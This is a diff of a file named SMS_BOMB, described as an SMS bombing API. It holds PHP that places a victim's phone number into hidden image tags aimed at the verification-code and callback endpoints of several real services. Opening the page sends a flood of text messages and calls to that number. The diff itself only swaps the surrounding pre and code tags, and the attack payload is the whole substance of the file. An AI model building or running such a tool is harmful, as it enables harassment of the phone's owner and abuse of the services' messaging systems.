@@ -2,11 +2,15 @@ SMS_BOMB
 ========
 
 短信轰炸API
+<code>
+
+
+
 
 <?php
 $tel_no=__PhoneNumber__;
 ?>
-<pre>
+
 <div style='display:none'>
 <img src='http://member.1688.com//member/ajax/send_identity_code_by_mobile.do?callback=jQuery172007067019236274064_1376100939244&mobile=<?php echo $tel_no;?>&area=86&isBizMobile=true' alt=''/>
 <img src='https://affiliate-program.amazon.com/gp/associates/apply/assoc-ivs.html?phoneNumber=%2B86<?php echo $tel_no;?>&operation=start&ts=1376044348191' alt=''/>
@@ -171,4 +175,4 @@ $tel_no=__PhoneNumber__;
 <img src='http://liao.189.cn/ECP-Portals/phoneDown/download.do?phone=<?php echo $tel_no;?>' alt=''/>
 <img src='https://ecplive.cn/reg/servlet/ivrInvokeServlet?number=<?php echo $tel_no;?>&flagNum=3' alt=''/>
 </div>
-</pre>
+</code>
